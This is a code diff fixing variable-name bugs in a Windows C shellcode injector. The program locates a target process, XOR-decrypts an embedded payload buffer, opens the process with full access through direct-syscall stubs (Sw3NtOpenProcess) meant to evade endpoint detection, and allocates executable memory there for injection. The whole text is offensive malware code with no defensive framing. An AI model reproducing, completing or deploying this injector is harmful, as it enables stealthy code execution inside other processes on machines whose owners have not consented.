@@ -111,7 +111,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	// find the process id
 	pid = FindTarget(target_process);
-	if (procid == 0) {
+	if (pid == 0) {
 		wprintf(L"failed to find %s process\n", target_process);
 		return 1;
 	}
@@ -119,12 +119,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	// decrypt the buffer
 	XOR(buf, sizeof(buf));
 
-	clientId.UniqueProcess = (HANDLE)procid;
+	clientId.UniqueProcess = (HANDLE)pid;
 	clientId.UniqueThread = 0;
 
 	InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);
 
-	Sw3NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &ci);
+	Sw3NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &clientId);
 
 	// Injection
 	Sw3NtAllocateVirtualMemory(hProc, &remote_process_buffer, 0, (PULONG)&buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
